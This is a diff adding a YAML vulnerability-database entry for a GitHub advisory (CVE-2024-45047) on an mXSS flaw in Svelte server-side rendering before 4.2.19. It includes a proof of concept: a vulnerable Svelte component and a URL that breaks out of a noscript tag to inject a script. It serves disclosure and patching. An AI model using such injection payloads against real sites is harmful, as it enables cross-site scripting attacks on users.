@@ -1,0 +1,86 @@
+advisory_id: GHSA-8266-84wp-wv5c
+datasource_id: github_osv_importer_v2/GHSA-8266-84wp-wv5c
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-8266-84wp-wv5c/GHSA-8266-84wp-wv5c.json
+aliases:
+  - CVE-2024-45047
+summary: |
+  Svelte has a potential mXSS vulnerability due to improper HTML escaping
+  ### Summary
+
+  A potential XSS vulnerability exists in Svelte for versions prior to 4.2.19.
+
+  ### Details
+
+  Svelte improperly escapes HTML on server-side rendering. It converts strings according to the following rules:
+
+  - If the string is an attribute value:
+      - `"` -> `&quot;`
+      - `&` -> `&amp;`
+      - Other characters -> No conversion
+  - Otherwise:
+      - `<` -> `&lt;`
+      - `&` -> `&amp;`
+      - Other characters -> No conversion
+
+  The assumption is that attributes will always stay as such, but in some situation the final DOM tree rendered on browsers is different from what Svelte expects on server-side rendering. This may be leveraged to perform XSS attacks. More specifically, this can occur when injecting malicious content into an attribute within a `<noscript>` tag.
+
+  ### PoC
+
+  A vulnerable page (`+page.svelte`):
+  ```html
+  <script>
+  import { page } from "$app/stores"
+
+  // user input
+  let href = $page.url.searchParams.get("href") ?? "https://example.com";
+  </script>
+
+  <noscript>
+    <a href={href}>test</a>
+  </noscript>
+  ```
+
+  If a user accesses the following URL,
+  ```
+  http://localhost:4173/?href=</noscript><script>alert(123)</script>
+  ```
+  then, `alert(123)` will be executed.
+
+  ### Impact
+
+  XSS, when using an attribute within a noscript tag
+impacted_packages:
+  - purl: pkg:npm/svelte
+    affected_versions: vers:npm/<4.2.19
+    fixed_versions: vers:npm/4.2.19
+severities:
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-8266-84wp-wv5c/GHSA-8266-84wp-wv5c.json
+  - score: '5.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-8266-84wp-wv5c/GHSA-8266-84wp-wv5c.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/sveltejs/svelte
+    reference_type:
+    reference_id:
+  - url: https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3
+    reference_type:
+    reference_id:
+  - url: https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45047
+    reference_type:
+    reference_id:
